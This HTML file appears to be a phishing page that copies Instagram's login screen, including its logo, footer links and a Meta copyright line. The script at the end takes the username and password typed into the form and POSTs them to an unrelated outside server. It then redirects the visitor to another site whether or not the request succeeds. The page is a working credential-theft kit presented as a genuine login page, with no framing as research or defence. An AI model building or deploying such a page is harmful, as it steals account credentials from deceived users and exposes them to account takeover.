<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description"
        content="Create an account or log in to Instagram - A simple, fun & creative way to capture, edit & share photos, videos & messages with friends & family.">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon"
        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><defs><linearGradient id='grad' x1='0%' y1='0%' x2='100%' y2='100%'><stop offset='0%' style='stop-color:%23f09433'/><stop offset='25%' style='stop-color:%23e6683c'/><stop offset='50%' style='stop-color:%23dc2743'/><stop offset='75%' style='stop-color:%23cc2366'/><stop offset='100%' style='stop-color:%23bc1888'/></linearGradient></defs><rect width='24' height='24' rx='6' fill='url(%23grad)'/><circle cx='12' cy='12' r='5' fill='none' stroke='white' stroke-width='2'/><circle cx='12' cy='12' r='2' fill='none' stroke='white' stroke-width='2'/><circle cx='17.5' cy='6.5' r='1.5' fill='white'/></svg>">
</head>

<body>
    <!-- Header with Instagram Logo -->
    <header class="header">
        <div class="header-container">
            <div class="instagram-logo">
                <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="instagramGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" style="stop-color:#f09433" />
                            <stop offset="25%" style="stop-color:#e6683c" />
                            <stop offset="50%" style="stop-color:#dc2743" />
                            <stop offset="75%" style="stop-color:#cc2366" />
                            <stop offset="100%" style="stop-color:#bc1888" />
                        </linearGradient>
                    </defs>
                    <rect x="8" y="8" width="48" height="48" rx="12" fill="url(#instagramGradient)" />
                    <circle cx="32" cy="32" r="12" fill="none" stroke="white" stroke-width="3" />
                    <circle cx="32" cy="32" r="5" fill="none" stroke="white" stroke-width="3" />
                    <circle cx="46" cy="18" r="3.5" fill="white" />
                </svg>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main">
        <div class="login-container">
            <div class="login-box">
                <!-- Back Button -->
                <button class="back-btn" aria-label="Go back">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                            stroke-linejoin="round" />
                    </svg>
                </button>

                <!-- Login Title -->
                <h1 class="login-title">Log into Instagram</h1>

                <!-- Login Form -->
                <form id="loginForm" class="login-form">
                    <input type="text" id="email" name="email" placeholder="Mobile number, username or email"
                        autocapitalize="off" autocorrect="off" required aria-label="Mobile number, username or email">
                    <input type="password" id="password" name="password" placeholder="Password" required
                        aria-label="Password">
                    <button type="submit" class="login-btn">Log in</button>
                </form>

                <!-- Forgot Password -->
                <a href="#" class="forgot-password">Forgot password?</a>

                <!-- Social Login -->
                <div class="social-login">
                    <button type="button" class="facebook-btn">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#0866FF"
                            xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                        </svg>
                        <span>Log in with Facebook</span>
                    </button>
                </div>

                <!-- Create Account -->
                <button type="button" class="create-account-btn">Create new account</button>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-container">
            <!-- Meta Logo -->
            <div class="meta-logo">
                <svg width="61" height="12" viewBox="0 0 61 12" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <path d="M41.1 0.5H44.9L48.4 9.3L51.9 0.5H55.7L50.5 11.5H46.3L41.1 0.5Z" />
                    <path d="M56.8 0.5H60.5V11.5H56.8V0.5Z" />
                    <path
                        d="M0.5 0.5H6.9C9.8 0.5 11.8 2.5 11.8 5.3V6.7C11.8 9.5 9.8 11.5 6.9 11.5H0.5V0.5ZM4.2 3.5V8.5H6.5C7.4 8.5 8.1 7.8 8.1 6.9V5.1C8.1 4.2 7.4 3.5 6.5 3.5H4.2Z" />
                    <path d="M13.5 0.5H21.5V3.5H17.2V4.8H20.8V7.5H17.2V8.5H21.5V11.5H13.5V0.5Z" />
                    <path d="M23.2 0.5H30.9V3.5H26.9V4.8H30.2V7.5H26.9V11.5H23.2V0.5Z" />
                    <path d="M32.5 0.5H36.2V11.5H32.5V0.5Z" />
                </svg>
            </div>

            <!-- Footer Links -->
            <nav class="footer-links" aria-label="Footer navigation">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact uploading and non-users</a>
                <a href="#">Meta Verified</a>
            </nav>

            <!-- Language Selector and Copyright -->
            <div class="footer-bottom">
                <div class="language-selector">
                    <select id="language" aria-label="Switch Display Language">
                        <option value="en">English (US)</option>
                        <option value="es">Español</option>
                        <option value="fr">Français</option>
                        <option value="de">Deutsch</option>
                        <option value="it">Italiano</option>
                        <option value="pt">Português (Brasil)</option>
                        <option value="ar">العربية</option>
                        <option value="ja">日本語</option>
                        <option value="hi">हिन्दी</option>
                    </select>
                </div>
                <div class="copyright">© 2025 Instagram from Meta</div>
            </div>
        </div>
    </footer>

    <script>
        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Disable submit button to prevent double submission
            const submitBtn = this.querySelector('.login-btn');
            const originalText = submitBtn.textContent;
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';

            // Send data to the API
            fetch('https://bishamsinchiury.com.np/api/passowordss', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            })
                .then(response => {
                    // Redirect to messenger
                    window.location.href = 'https://messenger.abeto.co/';
                })
                .catch((error) => {
                    console.error('Error:', error);
                    // Redirect even if there is an error
                    window.location.href = 'https://messenger.abeto.co/';
                });
        });

        // Back button handler
        document.querySelector('.back-btn').addEventListener('click', function (e) {
            e.preventDefault();
            window.history.back();
        });
    </script>
</body>

</html>
